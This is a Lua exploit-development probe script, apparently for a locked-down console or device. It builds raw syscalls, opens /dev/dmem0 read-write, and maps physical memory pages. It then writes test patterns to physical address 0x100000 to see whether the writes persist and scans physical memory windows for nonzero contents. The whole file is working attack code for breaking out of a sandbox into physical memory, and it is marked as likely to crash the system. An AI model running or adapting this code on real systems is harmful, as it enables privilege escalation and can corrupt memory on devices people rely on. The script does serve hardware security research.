-- CRASH_CLASS: HIGH
-- PROBE 806d: fine scan of the dmem window, and a write-persistence test outside the pool
print("=== PROBE 806d: DMEM WINDOW FINE SCAN ===")
print("")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function u64(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_open = make_syscall(5)
pcall(function() return getpid() end)
local s = "/dev/dmem0"
local cpath = memory.alloc(32)
for i = 1, #s do pcall(function() memory.write_byte(cpath + i - 1, s:byte(i)) end) end
pcall(function() memory.write_byte(cpath + #s, 0) end)
local fd = to_num(select(2, pcall(function() return sc_open(uint64(cpath), uint64(2), uint64(0)) end)))
print("[0] fd=" .. fd)
local VA = 0x880000000
local function map_at(phys)
    pcall(function() return sc_munmap(uint64(VA), uint64(0x4000)) end)
    local ok, r = pcall(function()
        return sc_mmap(uint64(VA), uint64(0x4000), uint64(0x33), uint64(0x11),
            uint64(fd), u64(math.floor(phys / 4294967296), phys % 4294967296))
    end)
    if not ok then return false end
    return to_num(r) == VA
end
local function unmap() pcall(function() return sc_munmap(uint64(VA), uint64(0x4000)) end) end

print("")
print("[1] does a write outside the pool persist?")
if map_at(0x100000) then
    wd(VA, 0xA5A5A5A5)
    wd(VA + 4, 0x5A5A5A5A)
    local a, b = rd(VA), rd(VA + 4)
    print(string.format("  phys 0x100000 write A5A5A5A5 read %08X %08X -> %s",
        a or 0, b or 0, (a == 0xA5A5A5A5) and "PERSISTS" or "dropped"))
    unmap()
end
print("")
print("[2] fine scan")
local windows = {
    {0x0, 0x20000000},
    {0x100000000, 0x120000000},
}
for wi, w in ipairs(windows) do
    local start, stop = w[1], w[2]
    local total, nz = 0, 0
    local ex = {}
    local p = start
    local t0 = os.time and os.time() or 0
    while p < stop do
        if map_at(p) then
            total = total + 1
            local lo, hi = rd(VA), rd(VA + 4)
            if (lo or 0) ~= 0 or (hi or 0) ~= 0 then
                nz = nz + 1
                if #ex < 24 then ex[#ex + 1] = string.format("%X=%08X%08X", p, hi or 0, lo or 0) end
            end
            unmap()
        end
        p = p + 0x4000
    end
    print(string.format("  window %d [%X,%X) mapped=%d nonzero=%d", wi, start, stop, total, nz))
    if #ex > 0 then print("    " .. table.concat(ex, " ")) end
end
print("")
print("[3] alive pid=" .. to_num(getpid()))
